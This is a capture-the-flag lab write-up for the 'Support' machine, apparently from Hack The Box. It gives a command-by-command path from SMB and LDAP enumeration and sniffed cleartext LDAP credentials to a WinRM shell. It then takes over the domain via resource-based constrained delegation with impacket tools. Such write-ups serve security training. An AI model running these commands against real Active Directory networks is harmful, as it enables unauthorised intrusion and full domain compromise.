# Support - Easy

```sh
sudo vim /etc/hosts
# add support.htb

nmap -T4 -p- -A -Pn -v support.htb
```

* open ports & services:

    * 53/tcp - dns - Simple DNS Plus
    * 88/tcp - kerberos-sec - Microsoft Windows Kerberos
    * 135/tcp - msrpc - Microsoft Windows RPC
    * 139/tcp - netbios-ssn - Microsoft Windows netbios-ssn
    * 389/tcp - ldap - Microsoft Windows Active Directory LDAP
    * 445/tcp - microsoft-ds
    * 464/tcp - kpasswd5
    * 593/tcp - ncacn_http - Microsoft Windows RPC over HTTP 1.0
    * 636/tcp - tcpwrapped
    * 3268/tcp - ldap - Microsoft Windows Active Directory LDAP
    * 3269/tcp - tcpwrapped
    * 5985/tcp - http - Microsoft HTTPAPI httpd 2.0

* ```nmap``` scan indicates that the machine could be a part of an AD environment

* we can try general enumeration first using ```enumlinux```:

    ```sh
    enum4linux support.htb -A -C
    # this does not give any info
    ```

* for enumerating kerberos, we need a valid list of usernames so that we can use tools like ```kerbrute``` - we can check this later

* enumerating RPC & SMB:

    ```sh
    rpcinfo -p support.htb
    # does not work

    rpcclient -U "" support.htb
    # empty password works

    srvinfo
    
    enumdomains
    # 'NT_STATUS_ACCESS_DENIED'
    # other queries also fail
    ```

    ```sh
    smbclient -N -L //support.htb
    # this lists a few shares
    ```

* SMB share listing shows a few non-default shares - 'NETLOGON', 'support-tools' and 'SYSVOL' - we can check them further:

    ```sh
    smbclient \\\\support.htb\\NETLOGON
    # unsuccessful

    smbclient \\\\support.htb\\SYSVOL
    # unsuccessful

    smbclient \\\\support.htb\\support-tools
    # this works

    dir
    # we have a few tools here

    # fetch the user info file
    get UserInfo.exe.zip

    exit
    ```

* the 'support-tools' share includes ZIP & EXE files for some tools and their installation; this also includes a file named 'UserInfo.exe.zip' - which does not seem to be associated with any utility, so we can check this further:

    ```sh
    unzip UserInfo.exe.zip
    # extracts several files

    ls -la

    file UserInfo.exe
    # PE32 executable, Mono/.Net
    ```

* along with the executable 'UserInfo.exe', we get many DLLs and a '.config' file which does not contain any useful info

* we can transfer these files to our Windows VM for further inspection

* if we simply run the 'UserInfo.exe', we see a CMD pop-up and close, but no other info is shown

* we can try to run this via CMD:

    ```sh
    .\UserInfo.exe
    ```

* the help section shows commands 'find' and 'user', and an option for '--verbose'/'-v'

* we can also run the EXE file in our attacker machine if we have [wine installed](https://notes.benheater.com/books/kali-optimizations/page/installing-wine-and-wine-dependencies):

    ```sh
    sudo dpkg --add-architecture i386

    sudo apt update

    sudo apt install wine wine64 wine32:i386 winetricks mono-complete

    wine --version
    # check current wine version

    # refer wine mono version <= current wine version - https://gitlab.winehq.org/wine/wine/-/wikis/Wine-Mono#versions

    wget https://dl.winehq.org/wine/wine-mono/9.4.0/wine-mono-9.4.0-x86.msi

    wine uninstaller
    # load the downloaded MSI file by clicking on 'Install'

    # now we can run the EXE

    wine UserInfo.exe
    ```

* run 'UserInfo.exe' with its options:

    ```sh
    wine UserInfo.exe -v find 'test'
    # the program gives an error saying '-first' or '-last' is required

    wine UserInfo.exe -v find -first 'test' -last 'this'
    # it uses LDAP query, then times out with the exception 'connect error'

    wine UserInfo.exe -v user 'test'
    # the program needs a required option '-username'

    wine UserInfo.exe -v user -username 'test'
    # the program times out with the exception 'connect error'
    ```

* for the 'find' command, the program uses a LDAP query in the format ```(&(givenName=firstname)(sn=lastname))``` - then we get a timeout with exception for 'connect error'

* for the 'user' command, the program tries to get data for given username, and then hits the timeout with exception for 'connect error'

* for both options, the 'connect error' would have likely occurred as the test was done when the target box was not alive; we can test this again with the target machine up

* if the target machine is active, then we get an error "Exception: No Such Object"

* as the program tries to perform LDAP queries, it could possibly be connecting to the target box - we can try sniffing the traffic using ```wireshark```, and then run the program:

    ```sh
    sudo wireshark
    # select 'tun0' interface

    # run the exe
    wine UserInfo.exe -v find -first 'test' -last 'this'

    wine UserInfo.exe -v user -username 'test'
    ```

* ```wireshark``` is able to capture some TCP & LDAP traffic - we can inspect each of the packets

* if we check the LDAP packets with the 'bindRequest' message, we can see simple authentication is set for user 'support\ldap' and the cleartext password 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' is also shown

* we can confirm if these are valid creds:

    ```sh
    sudo crackmapexec smb support.htb -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
    # this works

    # check if we can get a shell

    psexec.py support.htb/ldap@support.htb
    # this does not work

    evil-winrm -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -i support.htb
    # this also does not work
    ```

* the creds are valid for user 'ldap', but we cannot seem to get a shell using these creds

* as we have valid domain user creds, we can try enumeration using ```bloodhound```:

    ```sh
    # since we do not have a shell, we need to use bloodhound-python

    sudo bloodhound-python -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -ns 10.129.227.56 -d support.htb -c all
    # this creates multiple JSON files

    zip -r supportbh.zip *.json
    # create ZIP file to be imported in bloodhound

    sudo neo4j start
    # start neo4j

    bloodhound
    # start bloodhound
    ```

* in ```bloodhound```, we can upload the 'supportbh.zip' file under Administration > File Ingest, and then navigate to Explore to use all the Pre-built searches

* the prebuilt searches do not give any interesting data; we can try custom queries for basic domain enumeration:

    * ```MATCH (m:Computer) RETURN m``` - display all computers
    * ```MATCH (m:User) RETURN m``` - display all users
    * ```MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p``` - display all active sessions in domain

* the Cypher query to display all users gives us several usernames - we can store all these usernames in a file:

    ```sh
    vim usernames.txt
    ```

* since we do not have anything else in ```bloodhound```, we can continue our service enumeration with valid domain creds for user 'ldap'

* enumerating LDAP:

    ```sh
    ldapsearch -x -H ldap://support.htb -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "dc=support,dc=htb"
    # -x for simple authentication
    # -H for LDAP URI
    # -D for distinguished name used for LDAP binding
    # -w for password for simple auth
    # -b for the search base

    # this gives a lot of output, so we can save it to a file

    ldapsearch -x -H ldap://support.htb -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "dc=support,dc=htb" > ldapoutput
    
    less ldapoutput
    ```

* ```ldapsearch``` dumps a lot of info - we can check for any secrets or clues; we can search for strings like 'password' but this gives too many hits

* we can also search for text via ```grep``` or by searching in a text editor like ```mousepad```; in this case, I searched for the text 'Users, support.htb' to match the blob of text before each user properties section

* checking the 'support' user properties, there is a non-default key 'info' with a string "Ironside47pleasure40Watchful" - this could be the password for 'support' user

* we can check if this is a valid password:

    ```sh
    sudo crackmapexec smb support.htb -u 'support' -p 'Ironside47pleasure40Watchful'
    # this is valid

    # check if we can get a shell
    evil-winrm -u 'support' -p 'Ironside47pleasure40Watchful' -i support.htb
    # this works

    type C:\Users\support\Desktop\user.txt
    # user flag
    ```

* from the ```bloodhound``` view, we can mark the user 'support@support.htb' as owned, and check for prebuilt queries for any privesc vectors

* checking the node info for this user, we can see that it is a member of 3 groups:

    * 'shared support accounts@support.htb'
    * 'remote management users@support.htb'
    * 'domain users@support.htb'

* the 'Shared Support Accounts' group is non-default, so we can check on this group for any privesc vectors - we can mark this group as owned

* if we check one of the 'Shortest Paths' queries like 'Shortest Paths to Domain Admins from Owned Principals', we can see the following relations:

    * 'shared support accounts@support.htb' -> Generic All -> 'dc.support.htb'
    * 'dc.support.htb' -> DCSync -> 'support.htb'

* select the 'Generic All' edge and click on Help > Windows Abuse - this shows that full control of a computer object can be used to perform a RBCD (resource based constrained delegation) attack

* this info can also be found using ```PowerView.ps1``` - specifically the command ```Invoke-ACLScanner -ResolveGUIDs``` - which shows the 'Shared Support Accounts' group having 'GenericAll' rights over 'dc.support.htb'

* Resource Based Constrained Delegation is different from Constrained Delegation as the former involves a target machine account, whereas the latter has a target user account

* we can [exploit RBCD from the Windows machine itself as well as from attacker](https://medium.com/@offsecdeer/a-practical-guide-to-rbcd-exploitation-a3f1a47267d5) - in this case, we will do it from the attacker using ```impacket``` tools:

    * first, create a machine account (we can abuse RBCD on the given computer account too, but this is safer):

        ```sh
        impacket-addcomputer -computer-name 'rbcd-test$' -computer-pass 'Password123!' -dc-ip 10.129.227.56 support.htb/support:'Ironside47pleasure40Watchful'
        # SAM account name ends with '$' for computer accounts
        ```
    
    * configure RBCD for the new target account using the DC machine account:

        ```sh
        impacket-rbcd -delegate-to 'dc$' -delegate-from 'rbcd-test$' -dc-ip 10.129.227.56 -action write support.htb/support:'Ironside47pleasure40Watchful'
        ```
    
    * once the delegation rights are modified such that 'rbcd-test$' can impersonate users on 'dc$', we can request a service ticket for CIFS using ```getST.py``` to get an impersonation ticket:

        ```sh
        impacket-getST -spn cifs/dc.support.htb -impersonate Administrator -dc-ip 10.129.227.56 support.htb/rbcd-test:'Password123!'
        # this saves the ticket in 'Administrator.ccache'
        ```
    
    * now we can authenticate to the target as Administrator via impersonation TGS - use this to get a shell via ```psexec``` or dump hashes using ```secretsdump```:

        ```sh
        export KRB5CCNAME=Administrator.ccache

        sudo vim /etc/hosts
        # ensure domain 'dc.support.htb' is also added for target

        impacket-psexec -k -no-pass support.htb/administrator@dc.support.htb
        # this gives us shell

        whoami
        # nt authority\system

        type C:\Users\Administrator\Desktop\root.txt
        # root flag
        ```
